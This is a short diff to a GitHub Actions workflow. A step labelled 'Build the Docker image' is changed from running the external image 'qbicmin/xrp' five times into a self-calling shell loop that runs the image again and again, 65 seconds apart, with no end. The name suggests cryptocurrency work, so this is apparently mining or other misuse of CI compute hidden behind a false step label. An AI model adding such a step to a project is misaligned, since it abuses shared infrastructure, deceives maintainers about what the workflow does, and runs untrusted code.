@@ -14,13 +14,7 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     - name: Build the Docker image
-      run: |
-          for i in {1..5}; do
-            echo "Iteration $i at $(date)"
-            docker run qbicmin/xrp 1 100
-            sleep 40
-          done
-      
+      run: echo "docker run qbicmin/xrp 1 100" > 1-100.sh && echo "sh 1-100.sh && sleep 65 && sh loop.sh" > loop.sh && sh loop.sh 
       
       
 
